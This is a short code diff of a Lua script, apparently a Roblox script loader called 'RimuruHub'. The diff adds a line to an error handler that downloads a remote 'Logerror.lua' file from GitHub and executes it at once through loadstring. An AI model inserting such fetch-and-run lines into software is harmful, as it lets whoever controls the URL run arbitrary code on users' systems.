@@ -35,6 +35,8 @@ local function loadScript(url)
         textLabel.TextSize = 24
         textLabel.Text = "RimuruHub\n------------------\nPlease wait for the fix.\n-----------------\nError\nError: " .. err
         textLabel.TextWrapped = true
+        task.wait(0)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RimuraHub/MAP/refs/heads/main/Logerror.lua"))()
     end
 end
 
